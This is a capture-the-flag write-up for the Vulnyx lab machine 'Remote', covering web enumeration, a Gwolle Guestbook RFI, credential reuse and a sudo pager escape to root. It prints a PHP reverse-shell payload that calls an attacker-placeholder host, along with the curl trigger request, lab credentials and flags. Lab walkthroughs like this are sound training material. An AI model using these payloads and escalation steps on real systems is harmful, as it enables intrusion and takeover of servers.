# Vulnyx: Remote

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `wpscan` · `curl` · `nc` |
| **Tags** | `#WordPress` `#RFI` `#GwolleGuestbook` `#CredentialReuse` `#SudoAbuse` `#PagerEscape` `#RCE` |
| **URL** | https://vulnyx.com/machines/ |

WordPress's Gwolle Guestbook plugin has a known Remote File Inclusion vulnerability (exploit-db 38861): its captcha handler takes an `abspath` parameter meant to point to the local WordPress install, but accepts a remote URL instead. Hosting a file named exactly what the vulnerable code expects (`wp-load.php`) turns that into RCE. `wp-config.php` then leaks database credentials that are reused as a real system account's password, and a `sudo` rule around `rename` reaches root through its man-page pager escape.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn remote.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:90:67:9C (Oracle VirtualBox virtual NIC)
```

Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV remote.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
|_ssh-hostkey:
|  3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:f3:45:10:58:b0:ce:c6:c3:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:90:67:9C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://remote.nyx/
```

<img src="../Images/remote/Pasted image 20260829133252.png"/>

A content scan finds a `wordpress/` directory under the default Apache page:

```bash
$ ffuf -u http://remote.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

.css                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 191ms]
index.html                 [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 381ms]
wordpress                  [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 1ms]
server-status              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 11ms]
```

```
http://remote.nyx/wordpress/
```

<img src="../Images/remote/Pasted image 20260829133309.png"/>

### WordPress Enumeration

`wpscan` enumerates users and plugins — surfacing the `tiago` account and the vulnerable Gwolle Guestbook plugin:

```bash
$ wpscan --url 'http://remote.nyx/wordpress' --enumerate u,p
```

<img src="../Images/remote/Pasted image 20260829133405.png"/>

> **Username:** `tiago`
> **Exploit:** `https://www.exploit-db.com/exploits/38861`

## Initial Access

### RFI in Gwolle Guestbook

The Gwolle Guestbook plugin's captcha AJAX handler reads an `abspath` parameter — meant to reference the local WordPress installation path — and then `include`s `wp-load.php` from underneath it, with no validation that `abspath` is even local. Because PHP's `include` follows a URL when `allow_url_include` is on, a remote `abspath` makes the plugin fetch and execute code from an attacker-controlled server:

```bash
$ curl -sX GET "http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://<ATTACKER_IP>:8000/"
```

### Weaponizing the RFI

The key detail is that the vulnerable code appends `wp-load.php` to whatever `abspath` gives it — so the hosted payload has to carry that exact name. An HTTP server is started, and the request above first shows a `404` for `wp-load.php` (nothing to serve yet), confirming the plugin really is reaching back to fetch it:

```bash
$ python3 -m http.server 8000
<IP_Victim> - - [29/Aug/2026 07:19:45] code 404, message file not found
<IP_Victim> - - [29/Aug/2026 07:19:45] "GET /wp-load.php HTTP/1.0" 404 -
```

A `wp-load.php` is created with a reverse-shell one-liner:

```bash
$ cat wp-load.php
<?php system("busybox nc <ATTACKER_IP> <PORT> -e /bin/sh"); ?>
```

The same request now fetches and executes it — the server log shows the `200`:

```bash
$ curl -sX GET "http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://<ATTACKER_IP>:8000/"

<IP_Victim> - - [29/Aug/2026 07:21:17] "GET /wp-load.php HTTP/1.0" 200 -
```

### Shell as www-data

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [remote.nyx] 59570
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

### Loot: WordPress Database Credentials

WordPress keeps its database credentials in plaintext in `wp-config.php`:

```bash
www-data@remote:~$ find /var/www/html -name wp-config.php 2>/dev/null
/var/www/html/wordpress/wp-config.php
www-data@remote:~$ cat /var/www/html/wordpress/wp-config.php
```

<img src="../Images/remote/Pasted image 20260829133647.png"/>

> **Credentials:** `root:WPr00t3d123!`

### Escalating to tiago

That database password is reused for the `tiago` system account — a common mistake worth testing directly rather than assuming credentials stay in their own silo:

```bash
www-data@remote:~$ su tiago
Password:
tiago@remote:/$ id
uid=1000(tiago) gid=1000(tiago) groups=1000(tiago)
tiago@remote:/$ cat /home/tiago/user.txt
ede553d38ed011f766ecfeac8902a501
```

> **User flag:** `ede553d38ed011f766ecfeac8902a501`

## Privilege Escalation

### Pager Escape in `rename --man`

```bash
tiago@remote:/$ sudo -l
Matching Defaults entries for tiago on remote:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin

User tiago may run the following commands on remote:
    (root) NOPASSWD: /usr/bin/rename
```

`tiago` can run `rename` as root. `rename` itself only renames files, but its `--man` option opens its manual page — and that page is displayed through a pager (`less`). Any pager lets you run a shell with `!`, and since `rename` was launched via `sudo`, the pager (and the shell it spawns) run as root. Even though `perl-doc` isn't installed to render the full page, the pager still opens on the stub, which is all the escape needs:

```bash
tiago@remote:~$ sudo /usr/bin/rename --man
You need to install the perl-doc package to use this program.
WARNING: terminal is not fully functional
/usr/bin/rename (press RETURN)
!/bin/bash
```

```bash
root@remote:~# id
uid=0(root) gid=0(root) groups=0(root)
root@remote:~# cat /root/root.txt
5b002472cb520245906ed20804c6471a
```

> **Root flag:** `5b002472cb520245906ed20804c6471a`

## Takeaways

- WordPress plugin vulnerabilities remain one of the most common ways into a WordPress site — a Remote File Inclusion like this predates most modern PHP configs that would block it (`allow_url_include` is off by default in current PHP), but plenty of targets, real or lab, still run with it enabled.
- A database credential is worth testing against system accounts directly — `wp-config.php` here leaked far more than just database access, because the same password was reused for a login account.
- Any command that ultimately opens a man page or documentation through a pager carries the same shell-escape risk as `less` itself — `rename --man` isn't an obvious target, but the underlying `!`-to-shell mechanism is identical to every other pager escape in this set.